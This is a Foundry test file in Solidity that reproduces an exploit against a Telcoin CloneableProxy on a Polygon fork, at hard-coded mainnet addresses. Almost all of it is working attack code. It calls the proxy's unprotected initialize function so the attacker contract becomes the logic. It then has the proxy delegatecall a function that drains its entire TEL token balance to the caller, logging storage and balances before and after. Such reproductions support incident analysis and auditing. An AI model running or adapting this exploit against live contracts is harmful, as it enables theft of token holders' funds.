// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";

interface ICloneableProxy {
    function initialize(address _logic, bytes memory data) external;
}

ICloneableProxy constant CloneableProxy = ICloneableProxy(
    0x56BCADff30680EBB540a84D75c182A5dC61981C0
);
IERC20 constant TEL = IERC20(0xdF7837DE1F2Fa4631D716CF2502f8b230F1dcc32);

contract TelcoinTest is Test {
    function setUp() public {
        vm.createSelectFork("polygon", 51546495);
        vm.label(address(CloneableProxy), "CloneableProxy#1");
        vm.label(address(TEL), "TEL");
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() public {
        print("TEL balance before", TEL.balanceOf(address(this)), 2);
        bytes32 cloneableProxyPackedSlot0 = vm.load(
            address(CloneableProxy),
            bytes32(uint256(0))
        );
        console.log(
            "----------------------------------------------------------------"
        );
        emit log_named_bytes32(
            "CloneableProxy#1 storage packed slot 0 contents before exploit and reinitialization",
            cloneableProxyPackedSlot0
        );
        console.log(
            "----------------------------------------------------------------"
        );
        console.log(
            "CloneableProxy#1 storage packed slot 0 contents before exploit and reinitialization (two least significant bytes): uint8 _initializing: %s, bool _initialized: %s",
            uint8(cloneableProxyPackedSlot0[30]),
            uint8(cloneableProxyPackedSlot0[31])
        );
        console.log(
            "----------------------------------------------------------------"
        );
        console.log("---Exploit Time---");

        bytes memory data = abi.encodePacked(
            this.transferTELFromCloneableProxy.selector
        );
        CloneableProxy.initialize(address(this), data);

        cloneableProxyPackedSlot0 = vm.load(
            address(CloneableProxy),
            bytes32(uint256(0))
        );
        console.log(
            "----------------------------------------------------------------"
        );
        emit log_named_bytes32(
            "CloneableProxy#1 storage packed slot 0 contents after exploit and reinitialization",
            cloneableProxyPackedSlot0
        );
        console.log(
            "----------------------------------------------------------------"
        );
        console.log(
            "CloneableProxy#1 storage packed slot 0 contents after exploit and reinitialization (two least significant bytes): uint8 _initializing: %s, bool _initialized: %s",
            uint8(cloneableProxyPackedSlot0[30]),
            uint8(cloneableProxyPackedSlot0[31])
        );
        console.log(
            "----------------------------------------------------------------"
        );
        print("TEL balance after", TEL.balanceOf(address(this)), 2);

        // Sanity test after exploit
        vm.expectRevert("Initializable: contract is already initialized");
        CloneableProxy.initialize(address(this), "");
    }

    function implementation() external view returns (address) {
        return address(this);
    }

    // Function will be delegatecalled from CloneableProxy#1
    // Transfer only TEL because victim proxy doesn't have LINK balance
    function transferTELFromCloneableProxy() external {
        TEL.transfer(msg.sender, TEL.balanceOf(address(CloneableProxy)));
    }
}
